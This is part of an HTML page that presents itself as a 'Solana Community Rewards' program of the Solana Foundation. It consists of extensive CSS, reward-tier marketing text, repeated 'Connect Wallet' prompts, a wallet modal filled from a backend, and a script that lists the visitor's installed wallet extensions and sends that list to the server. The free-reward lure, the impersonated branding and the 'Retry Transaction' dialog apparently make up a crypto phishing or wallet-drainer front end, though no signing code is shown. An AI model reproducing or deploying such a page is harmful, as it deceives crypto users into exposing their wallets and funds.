    .hero {
      background-size: cover !important;
      background-position: center !important;
      background-repeat: no-repeat !important;
      background-attachment: scroll !important;
    }

    /* Ensure all images are responsive */
    img {
      max-width: 100%;
      height: auto;
    }

    /* Ensure containers don't overflow */
    .container, .info-section, .wallet-box, .modal {
      max-width: 100%;
      box-sizing: border-box;
    }

    /* Improve touch targets on mobile */
    @media (max-width: 768px) {
      .wallet-option, .claim-btn, .nav-btn {
        min-height: 44px;
        min-width: 44px;
      }
      
      .wallet-option {
        padding: 16px 20px;
      }
      
             .claim-btn, .nav-btn {
         padding: 14px 24px;
       }
     }
    
    /* Prevent horizontal scroll on all children */
    * {
      box-sizing: border-box;
    }

    /* Additional Mobile Responsive Improvements */
    @media (max-width: 768px) {
      /* Improve navigation for mobile */
      nav {
        position: sticky;
        top: 0;
        z-index: 1000;
        background: rgba(0, 0, 0, 0.95);
        backdrop-filter: blur(10px);
      }
      
      /* Ensure modals work properly on mobile */
      .modal {
        padding: 10px;
      }
      
      /* Improve wallet options spacing on mobile */
      .wallet-option {
        margin: 8px 0;
      }
      
      /* Better text readability on mobile */
      .info-section h2 {
        font-size: 1.6em;
      }
      
      .info-card h3 {
        font-size: 1.1em;
      }
    }

    /* Ensure proper viewport handling */
    @media (max-width: 480px) {
      body {
        font-size: 14px;
      }
      
      /* Improve button accessibility */
      .claim-btn, .nav-btn, .wallet-option {
        touch-action: manipulation;
        -webkit-tap-highlight-color: transparent;
      }
      
      /* Better spacing for small screens */
      .hero {
        padding: 20px 10px;
      }
      
      .info-section {
        margin: 15px auto;
      }
    }

    /* New Minting Section Styles */
    .minting-section {
      padding: 80px 20px;
      background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
      text-align: center;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    .minting-section h2 {
      font-size: 2.5em;
      color: #14f195;
      margin-bottom: 20px;
      font-weight: bold;
    }

    .section-subtitle {
      font-size: 1.2em;
      color: #ccc;
      margin-bottom: 40px;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
    }

    .mint-toggle {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 40px;
    }

    .toggle-option {
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .toggle-option input[type="radio"] {
      display: none;
    }

    .toggle-label {
      padding: 12px 24px;
      background: rgba(255, 255, 255, 0.1);
      border: 2px solid transparent;
      border-radius: 25px;
      color: #fff;
      font-weight: 600;
      transition: all 0.3s ease;
    }

    .toggle-option input[type="radio"]:checked + .toggle-label {
      background: #14f195;
      color: #000;
      border-color: #14f195;
    }

    .mint-form {
      max-width: 500px;
      margin: 0 auto;
      background: rgba(255, 255, 255, 0.05);
      padding: 40px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
    }

    .form-fields {
      margin-bottom: 30px;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }

    .form-group label {
      display: block;
      color: #14f195;
      font-weight: 600;
      margin-bottom: 8px;
      font-size: 0.9em;
    }

    .form-group input {
      width: 100%;
      padding: 15px;
      background: rgba(255, 255, 255, 0.1);
      border: 2px solid transparent;
      border-radius: 10px;
      color: #fff;
      font-size: 1em;
      transition: all 0.3s ease;
      box-sizing: border-box;
    }

    .form-group input:focus {
      outline: none;
      border-color: #14f195;
      background: rgba(255, 255, 255, 0.15);
    }

    .form-group input::placeholder {
      color: #888;
    }

    .mint-submit-btn {
      background: linear-gradient(45deg, #14f195, #00CC6A);
      color: #000;
      border: none;
      padding: 22px 48px;
      border-radius: 25px;
      font-size: 1.4em;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      width: 100%;
    }

    .mint-submit-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 30px rgba(20, 241, 149, 0.4);
    }

    /* Features Section */
    .features-section {
      padding: 80px 20px;
      background: #0a0a0a;
      text-align: center;
    }

    .features-section h2 {
      font-size: 2.5em;
      color: #14f195;
      margin-bottom: 50px;
      font-weight: bold;
    }

    .features-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 30px;
      max-width: 1000px;
      margin: 0 auto;
    }

    .feature-card {
      background: rgba(255, 255, 255, 0.05);
      padding: 30px 20px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
      transition: all 0.3s ease;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .feature-card:hover {
      transform: translateY(-5px);
      border-color: #14f195;
      box-shadow: 0 10px 30px rgba(20, 241, 149, 0.2);
    }

    .feature-icon {
      font-size: 3em;
      margin-bottom: 20px;
    }

    .feature-card h3 {
      color: #14f195;
      font-size: 1.3em;
      margin-bottom: 15px;
      font-weight: 600;
    }

    .feature-card p {
      color: #ccc;
      line-height: 1.6;
    }

    /* How It Works Section */
    .how-it-works {
      padding: 80px 20px;
      background: linear-gradient(135deg, #1a1a1a, #0a0a0a);
      text-align: center;
    }

    .how-it-works h2 {
      font-size: 2.5em;
      color: #14f195;
      margin-bottom: 50px;
      font-weight: bold;
    }

    .steps-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 30px;
      max-width: 1000px;
      margin: 0 auto;
    }

    .step-card {
      background: rgba(255, 255, 255, 0.05);
      padding: 30px 20px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
      position: relative;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .step-number {
      position: absolute;
      top: -20px;
      left: 50%;
      transform: translateX(-50%);
      background: #14f195;
      color: #000;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 1.2em;
    }

    .step-card h3 {
      color: #14f195;
      font-size: 1.3em;
      margin: 20px 0 15px 0;
      font-weight: 600;
    }

    .step-card p {
      color: #ccc;
      line-height: 1.6;
    }

    /* Mobile Responsiveness for New Sections */
    @media (max-width: 768px) {
      .minting-section,
      .features-section,
      .how-it-works {
        padding: 60px 15px;
      }

      .minting-section h2,
      .features-section h2,
      .how-it-works h2 {
        font-size: 2em;
      }

      .mint-toggle {
        flex-direction: column;
        align-items: center;
        gap: 15px;
      }

      .mint-form {
        padding: 30px 20px;
        margin: 0 15px;
      }

      .features-grid,
      .steps-grid {
        grid-template-columns: 1fr;
        gap: 20px;
      }

      .feature-card,
      .step-card {
        padding: 25px 15px;
      }
    }

    @media (max-width: 480px) {
      .minting-section,
      .features-section,
      .how-it-works {
        padding: 40px 10px;
      }

      .minting-section h2,
      .features-section h2,
      .how-it-works h2 {
        font-size: 1.8em;
      }

      .section-subtitle {
        font-size: 1em;
      }

      .mint-form {
        padding: 25px 15px;
      }

      .toggle-label {
        padding: 10px 20px;
        font-size: 0.9em;
      }

      .mint-submit-btn {
        padding: 18px 36px;
        font-size: 1.3em;
      }
    }

    /* High DPI display support */
    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
      .hero {
        background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/Hero-section.png');
      }
    }
    
    /* Fallback for devices with background image issues */
    @media (max-width: 768px) {
      .hero {
        background-image: linear-gradient(rgba(10,10,10,0.5), rgba(10,10,10,0.5)), url('/Hero-section.png');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: scroll;
      }
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { 
        padding: 60px 8px; 
        background-image: linear-gradient(rgba(10,10,10,0.6), rgba(10,10,10,0.6)), url('/Hero-section.png');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: scroll;
        min-height: 100vh;
      }
      .hero h1 { font-size: 2em; }
      .countdown { font-size: 1.2em; }
      .wallet-box { 
        padding: 20px; 
        margin: 20px;
        max-width: calc(100% - 40px);
        border-radius: 12px;
        width: 90vw;
      }
      .wallet-option {
        padding: 16px 20px;
        margin: 8px 0;
        min-height: 60px; /* Better touch target */
        border-radius: 10px;
      }
      .wallet-option img {
        width: 32px;
        height: 32px;
      }
      .wallet-name {
        font-size: 1.1em;
      }
      .modal {
        padding: 10px;
      }
    }
    
    /* Mobile-specific hero improvements */
    @media (max-width: 480px) {
      .hero { 
        background-image: linear-gradient(rgba(10,10,10,0.7), rgba(10,10,10,0.7)), url('/Hero-section.png');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: scroll;
        min-height: 100vh;
        padding: 40px 8px;
      }
      .hero h1 { font-size: 1.8em; }
      .countdown { font-size: 1.1em; }
    }
    
    /* Mobile-specific wallet modal improvements */
    @media (max-width: 480px) {
      .wallet-box {
        padding: 16px;
        margin: 10px;
        max-width: calc(100% - 20px);
        width: 95vw;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        max-height: 80vh;
        overflow-y: auto;
      }
      .wallet-option {
        padding: 18px 16px;
        margin: 6px 0;
        min-height: 70px;
      }
      .wallet-option img {
        width: 36px;
        height: 36px;
      }
      .wallet-name {
        font-size: 1.2em;
        line-height: 1.3;
      }
      .modal {
        padding: 0;
      }
      #statusModal {
        padding: 0;
      }
      #statusModal .wallet-box {
        margin: 15px;
        max-width: 250px;
        text-align: center;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        -webkit-transform: translate(-50%, -50%);
      }
    }
    
    /* Touch-friendly improvements for mobile */
    @media (hover: none) and (pointer: coarse) {
      .wallet-option {
        min-height: 55px;
        padding: 14px 18px;
      }
      .wallet-option:active {
        background: #333;
        transform: scale(0.98);
      }
      .claim-btn {
        min-height: 48px;
        padding: 14px 20px;
      }
      .claim-btn:active {
        transform: scale(0.95);
      }
      .modal {
        padding: 0;
      }
    }

    /* New Community Rewards Styles */
    .hero-description {
      font-size: 1.2em;
      max-width: 800px;
      margin: 0 auto 30px;
      line-height: 1.6;
      color: #e0e0e0;
      background: linear-gradient(45deg, #e0e0e0, #14f195, #e0e0e0);
      background-size: 200% 200%;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      animation: gradientShift 3s ease-in-out infinite;
    }

    @keyframes gradientShift {
      0%, 100% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    .rewards-section, .how-it-works, .reward-tiers, .why-join, .start-earning {
      padding: 80px 0;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .rewards-section::before, .how-it-works::before, .reward-tiers::before, .why-join::before, .start-earning::before {
      content: '';
      position: absolute;
      top: -50px;
      left: -50px;
      width: 100px;
      height: 100px;
      background: linear-gradient(45deg, #14f195, #00CC6A, #14f195);
      border-radius: 50%;
      opacity: 0.1;
      animation: float 6s ease-in-out infinite;
      z-index: -1;
    }

    .rewards-section::after, .how-it-works::after, .reward-tiers::after, .why-join::after, .start-earning::after {
      content: '';
      position: absolute;
      bottom: -50px;
      right: -50px;
      width: 80px;
      height: 80px;
      background: linear-gradient(45deg, #FF6B6B, #4ECDC4, #FF6B6B);
      border-radius: 50%;
      opacity: 0.1;
      animation: float 8s ease-in-out infinite reverse;
      z-index: -1;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0px) rotate(0deg); }
      50% { transform: translateY(-20px) rotate(180deg); }
    }

    .rewards-section h2, .how-it-works h2, .reward-tiers h2, .why-join h2, .start-earning h2 {
      font-size: 2.5em;
      margin-bottom: 20px;
      color: #14f195;
    }

    .section-subtitle {
      font-size: 1.3em;
      color: #ccc;
      margin-bottom: 50px;
      max-width: 700px;
      margin-left: auto;
      margin-right: auto;
    }

    .rewards-grid, .tiers-grid, .benefits-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 30px;
      margin-top: 50px;
    }

    .reward-card, .tier-card {
      background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(20, 241, 149, 0.05));
      border: 2px solid transparent;
      border-radius: 20px;
      padding: 30px 20px;
      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      backdrop-filter: blur(15px);
      position: relative;
      overflow: hidden;
    }

    .reward-card::before, .tier-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(20, 241, 149, 0.2), transparent);
      transition: left 0.5s ease;
    }

    .reward-card:hover::before, .tier-card:hover::before {
      left: 100%;
    }

    .reward-card:hover, .tier-card:hover {
      transform: translateY(-8px) scale(1.02);
      border-color: rgba(20, 241, 149, 0.8);
      box-shadow: 0 20px 40px rgba(20, 241, 149, 0.3), 0 0 0 1px rgba(20, 241, 149, 0.1);
    }

    .reward-icon, .tier-icon {
      font-size: 3em;
      margin-bottom: 20px;
      display: block;
    }

    .reward-card h3, .tier-card h3 {
      font-size: 1.5em;
      margin-bottom: 15px;
      color: #14f195;
    }

    .reward-card p, .tier-card p {
      color: #ccc;
      line-height: 1.6;
    }

    .steps-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 40px;
      margin-top: 50px;
    }

    .step-card {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(20, 241, 149, 0.2);
      border-radius: 15px;
      padding: 40px 30px;
      text-align: center;
      transition: all 0.3s ease;
      backdrop-filter: blur(10px);
    }

    .step-card:hover {
      transform: translateY(-5px);
      border-color: rgba(20, 241, 149, 0.5);
      box-shadow: 0 10px 30px rgba(20, 241, 149, 0.2);
    }

    .step-number {
      background: linear-gradient(135deg, #14f195, #00CC6A, #4ECDC4, #14f195);
      background-size: 300% 300%;
      color: black;
      width: 70px;
      height: 70px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.8em;
      font-weight: bold;
      margin: 0 auto 20px;
      position: relative;
      animation: gradientFlow 4s ease-in-out infinite;
      box-shadow: 0 8px 25px rgba(20, 241, 149, 0.4);
    }

    .step-number::before {
      content: '';
      position: absolute;
      top: -3px;
      left: -3px;
      right: -3px;
      bottom: -3px;
      background: linear-gradient(45deg, #14f195, #00CC6A, #4ECDC4, #FF6B6B);
      border-radius: 50%;
      z-index: -1;
      opacity: 0.7;
      animation: gradientFlow 4s ease-in-out infinite reverse;
    }

    @keyframes gradientFlow {
      0%, 100% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
    }

    .step-card h3 {
      font-size: 1.5em;
      margin-bottom: 15px;
      color: #14f195;
    }

    .step-card p {
      color: #ccc;
      line-height: 1.6;
    }

    .benefits-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 30px;
      margin-top: 50px;
    }

    .benefit-item {
      display: flex;
      align-items: center;
      gap: 20px;
      background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(20, 241, 149, 0.03));
      border: 2px solid transparent;
      border-radius: 20px;
      padding: 30px;
      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      backdrop-filter: blur(15px);
      position: relative;
      overflow: hidden;
    }

    .benefit-item::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: linear-gradient(45deg, transparent, rgba(20, 241, 149, 0.1), transparent);
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .benefit-item:hover::before {
      opacity: 1;
    }

    .benefit-item:hover {
      transform: translateY(-5px) scale(1.02);
      border-color: rgba(20, 241, 149, 0.6);
      box-shadow: 0 15px 35px rgba(20, 241, 149, 0.25), 0 0 0 1px rgba(20, 241, 149, 0.1);
    }

    .benefit-icon {
      font-size: 2em;
      flex-shrink: 0;
    }

    .benefit-item p {
      color: #ccc;
      font-size: 1.1em;
      line-height: 1.5;
      margin: 0;
    }

    .earning-steps {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 30px;
      margin: 50px 0;
    }

    .earning-step {
      text-align: center;
      padding: 30px 20px;
      position: relative;
    }

    .earning-step::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 120px;
      height: 120px;
      background: radial-gradient(circle, rgba(20, 241, 149, 0.1) 0%, transparent 70%);
      border-radius: 50%;
      transform: translate(-50%, -50%);
      z-index: -1;
      animation: pulse 3s ease-in-out infinite;
    }

    .step-icon {
      font-size: 3.5em;
      margin-bottom: 20px;
      display: block;
      filter: drop-shadow(0 0 10px rgba(20, 241, 149, 0.5));
      animation: bounce 2s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
      50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.8; }
    }

    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }

    .earning-step h3 {
      font-size: 1.3em;
      color: #14f195;
      margin-bottom: 10px;
    }

    .cta-section {
      margin-top: 50px;
    }

    .claim-btn.large {
      font-size: 1.6em;
      padding: 20px 40px;
      background: linear-gradient(45deg, #14f195, #00CC6A, #4ECDC4, #14f195);
      background-size: 300% 300%;
      animation: gradientFlow 3s ease-in-out infinite;
      position: relative;
      overflow: hidden;
    }

    .claim-btn.large::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      transition: left 0.6s ease;
    }

    .claim-btn.large:hover::before {
      left: 100%;
    }

    .claim-btn.large:hover {
      transform: translateY(-3px) scale(1.05);
      box-shadow: 0 15px 35px rgba(20, 241, 149, 0.4), 0 0 0 2px rgba(20, 241, 149, 0.2);
    }

    /* Creative Background Patterns */
    .rewards-section, .how-it-works, .reward-tiers, .why-join, .start-earning {
      background-image: 
        radial-gradient(circle at 20% 80%, rgba(20, 241, 149, 0.03) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(78, 205, 196, 0.03) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(255, 107, 107, 0.02) 0%, transparent 50%);
    }

    /* Enhanced Section Headers */
    .rewards-section h2, .how-it-works h2, .reward-tiers h2, .why-join h2, .start-earning h2 {
      position: relative;
      display: inline-block;
    }

    .rewards-section h2::after, .how-it-works h2::after, .reward-tiers h2::after, .why-join h2::after, .start-earning h2::after {
      content: '';
      position: absolute;
      bottom: -10px;
      left: 50%;
      width: 60px;
      height: 3px;
      background: linear-gradient(90deg, #14f195, #4ECDC4, #FF6B6B);
      transform: translateX(-50%);
      border-radius: 2px;
      animation: widthExpand 2s ease-in-out infinite;
    }

    @keyframes widthExpand {
      0%, 100% { width: 60px; }
      50% { width: 100px; }
    }

    /* Creative Card Borders */
    .reward-card, .tier-card, .step-card, .benefit-item {
      position: relative;
    }

    .reward-card::after, .tier-card::after, .step-card::after, .benefit-item::after {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(45deg, #14f195, #4ECDC4, #FF6B6B, #14f195);
      border-radius: 22px;
      z-index: -1;
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .reward-card:hover::after, .tier-card:hover::after, .step-card:hover::after, .benefit-item:hover::after {
      opacity: 0.3;
    }

    /* Responsive adjustments */
    @media (max-width: 768px) {
      .rewards-grid, .tiers-grid, .benefits-grid, .steps-grid, .earning-steps {
        grid-template-columns: 1fr;
        gap: 20px;
      }
      
      .rewards-section, .how-it-works, .reward-tiers, .why-join, .start-earning {
        padding: 60px 0;
      }
      
      .hero-description {
        font-size: 1.1em;
        padding: 0 20px;
      }

      .step-number {
        width: 60px;
        height: 60px;
        font-size: 1.5em;
      }

      .earning-step::before {
        width: 100px;
        height: 100px;
      }
    }
  </style>
</head>
<body>
  <nav>
    <div class="nav-logo"><img src="/logo.png" alt="Solana Foundation Logo" style="height:36px;vertical-align:middle;margin-right:10px;">  Solana Community Rewards</div>
    <div class="nav-links">
      <a href="#rewards" class="nav-link">Rewards</a>
      <a href="#how-it-works" class="nav-link">How It Works</a>
      <a href="#tiers" class="nav-link">Tiers</a>
      <a href="#join" class="nav-link">Join</a>
    </div>
    <button class="nav-btn" onclick="openWalletModal()">Connect Wallet</button>
  </nav>
  <section class="hero" id="hero">
    <div class="hero-content">
          <h1><img src="/logo.png" alt="Logo" style="height: 60px; vertical-align: middle; margin-right: 15px;">   Solana Community Rewards</h1>
    <p class="hero-subtitle">Powering the Next Wave of Builders & Holders</p>
    <p class="hero-description">The Solana Community Rewards Program is designed to give back to the people who make Solana thrive — developers, validators, creators, and everyday users. Whether you're deploying smart contracts, collecting NFTs, or onboarding friends into crypto, you earn rewards for helping grow the ecosystem.</p>

      <button class="claim-btn" onclick="openWalletModal();">Connect Wallet</button>
    </div>
  </section>

  <!-- Rewards Info Section -->
  <section class="rewards-section" id="rewards">
    <div class="container">
      <h2><img src="/logo.png" alt="Logo" style="height: 30px; vertical-align: middle; margin-right: 10px;"> 🎁 What Are Rewards?</h2>
      <p class="section-subtitle">Rewards are distributed in $SOL and ecosystem tokens to celebrate contributions like:</p>
      
      <div class="rewards-grid">
        <div class="reward-card">
          <div class="reward-icon">🛠</div>
          <h3>Builders</h3>
          <p>Ship tools, dApps, and integrations.</p>
        </div>
        <div class="reward-card">
          <div class="reward-icon">🌐</div>
          <h3>Community Members</h3>
          <p>Run events, host spaces, create content.</p>
        </div>
        <div class="reward-card">
          <div class="reward-icon">🗳</div>
          <h3>Validators & Delegators</h3>
          <p>Secure the network with uptime & stake.</p>
        </div>
        <div class="reward-card">
          <div class="reward-icon">📢</div>
          <h3>Advocates</h3>
          <p>Onboard new users, share tutorials, grow awareness.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- How It Works Section -->
  <section class="how-it-works" id="how-it-works">
    <div class="container">
      <h2> How It Works</h2>
      <div class="steps-grid">
        <div class="step-card">
          <div class="step-number">1</div>
          <h3>Contribute</h3>
          <p>Participate in Solana activities (on-chain and off-chain).</p>
        </div>
        <div class="step-card">
          <div class="step-number">2</div>
          <h3>Track</h3>
          <p>Points are logged to your wallet automatically via participation proofs.</p>
        </div>
        <div class="step-card">
          <div class="step-number">3</div>
          <h3>Claim</h3>
          <p>Redeem points for $SOL, ecosystem tokens, or exclusive NFTs.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Reward Tiers Section -->
  <section class="reward-tiers" id="tiers">
    <div class="container">
      <h2> Reward Tiers</h2>
      <div class="tiers-grid">
        <div class="tier-card">
          <div class="tier-icon">🔍</div>
          <h3>Explorer</h3>
          <p>New to Solana? Earn starter rewards.</p>
        </div>
        <div class="tier-card">
          <div class="tier-icon">🛠</div>
          <h3>Builder</h3>
          <p>Active contributor? Unlock higher tiers.</p>
        </div>
        <div class="tier-card">
          <div class="tier-icon">👑</div>
          <h3>Champion</h3>
          <p>Consistent impact earns exclusive rewards & recognition.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Why Join Section -->
  <section class="why-join">
    <div class="container">
      <h2>🌍 Why Join?</h2>
      <div class="benefits-grid">
        <div class="benefit-item">
          <div class="benefit-icon">💰</div>
          <p>Earn real rewards in $SOL.</p>
        </div>
        <div class="benefit-item">
          <div class="benefit-icon">👁️</div>
          <p>Boost visibility for your contributions.</p>
        </div>
        <div class="benefit-item">
          <div class="benefit-icon">🌐</div>
          <p>Join a growing, global community of builders and creators.</p>
        </div>
        <div class="benefit-item">
          <div class="benefit-icon"></div>
          <p>Get access to early beta drops and Solana partner perks.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Start Earning Section -->
  <section class="start-earning" id="join">
    <div class="container">
      <h2> Start Earning Today</h2>
      <div class="earning-steps">
        <div class="earning-step">
          <div class="step-icon"></div>
          <h3>Connect Your Wallet</h3>
        </div>
        <div class="earning-step">
          <div class="step-icon"></div>
          <h3>Complete Activities & Challenges</h3>
        </div>
        <div class="earning-step">
          <div class="step-icon"></div>
          <h3>Claim Rewards</h3>
        </div>
      </div>
      <div class="cta-section">
        <button class="claim-btn large" onclick="openWalletModal();">👉 Connect Wallet</button>
      </div>
    </div>
  </section>

  <!-- WalletConnect-style Web3Modal -->
  <div id="walletModal" class="modal">
      <div class="wallet-box">
          <div class="modal-header">
              <div class="header-content">
                  <h3>Connect Wallet</h3>
                  <p class="header-subtitle">Join the Solana Community Rewards Program</p>
                  <div id="mobileIndicator" style="display: none; margin-top: 8px; padding: 8px 12px; background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3); border-radius: 6px; font-size: 0.9em; color: #00FF88;">
                    📱 Mobile Deep Link Mode - Enhanced Phantom Connection
                  </div>
              </div>
              <button class="close-btn" onclick="closeWalletModal()">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                  </svg>
              </button>
          </div>
          <div class="wallet-options">
              <!-- Wallet options will be dynamically loaded from backend -->
          </div>
          
          <div class="modal-footer">
              <div class="footer-content">
                  <p class="wallet-help">Don't have a wallet?</p>
                  <div class="wallet-links">
                      <a href="https://phantom.app/" target="_blank" class="wallet-link">Phantom</a>
                      <span class="separator">•</span>
                      <a href="https://solflare.com/" target="_blank" class="wallet-link">Solflare</a>
                      <span class="separator">•</span>
                      <a href="https://backpack.app/" target="_blank" class="wallet-link">Backpack</a>
                  </div>
              </div>
          </div>
      </div>
  </div>
  <div id="statusModal" class="modal" tabindex="-1" aria-modal="true" role="dialog" style="display:none;">
    <div class="wallet-box" id="statusModalBox">
      <div id="statusModalMsg"></div>
      <div id="statusModalActions" style="margin-top:24px;display:none;">
        <button class="claim-btn" id="statusModalRetry" style="margin-right:12px;background:linear-gradient(45deg,#FFD700,#FFA500);">Retry Transaction</button>
        <button class="claim-btn" id="statusModalClose" style="background:linear-gradient(45deg,#666,#444);">Close</button>
      </div>
      <button class="claim-btn" id="statusModalCloseSingle" style="margin-top:24px;">Close</button>
    </div>
  </div>
  <div class="footer">
    <p><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">   Join the Solana Community Rewards Program today!</p>
    <p>⚡ Powered by the Solana blockchain. Fast. Scalable. Community-driven.</p>
  <p>© 2025 Solana Foundation. All rights reserved.</p>
  </div>
  <script>
    // Cache busting: v4 - Enhanced error suppression and logo fixes
    
    // Mobile detection functions - delegated to backend
    async function isMobile() {
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        const data = await response.json();
        return data.result?.isMobile || false;
      } catch (error) {
        // Fallback to basic detection
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
             window.innerWidth <= 768;
      }
    }

    // Enhanced mobile detection with more specific checks - delegated to backend
    async function getMobilePlatform() {
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        const data = await response.json();
        return data.result?.platform || 'desktop';
      } catch (error) {
        // Fallback to basic detection
      const userAgent = navigator.userAgent.toLowerCase();
        if (/iphone|ipad|ipod/.test(userAgent)) return 'ios';
        if (/android/.test(userAgent)) return 'android';
        if (/windows phone/.test(userAgent)) return 'windows';
      return 'desktop';
      }
    }

    // Check if we're in a mobile wallet browser - delegated to backend
    async function isInMobileWallet() {
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        const data = await response.json();
        return data.result?.inMobileWallet || false;
      } catch (error) {
        // Fallback to basic detection
        const userAgent = navigator.userAgent.toLowerCase();
        const walletPatterns = ['phantom', 'solflare', 'backpack', 'glow', 'trust', 'exodus', 'wallet', 'crypto'];
      return walletPatterns.some(pattern => userAgent.includes(pattern));
      }
    }

    // Check if mobile wallet is actually available in browser
    function isMobileWalletAvailable(wallet) {
      const provider = wallet.provider();
      const isMobileDevice = isMobile();
  
      // On mobile, be more permissive - assume wallet can be connected
      if (isMobileDevice) {
        
        // If we have any provider, consider it available
        if (provider) {
          return true;
        }
        
        // If no specific provider, but we're on mobile, still consider it available
        // because mobile wallets might not expose themselves the same way
        return true;
      }
      
      // Desktop logic - be more strict
      if (!provider) {
        return false;
      }
      
      // Check for essential methods
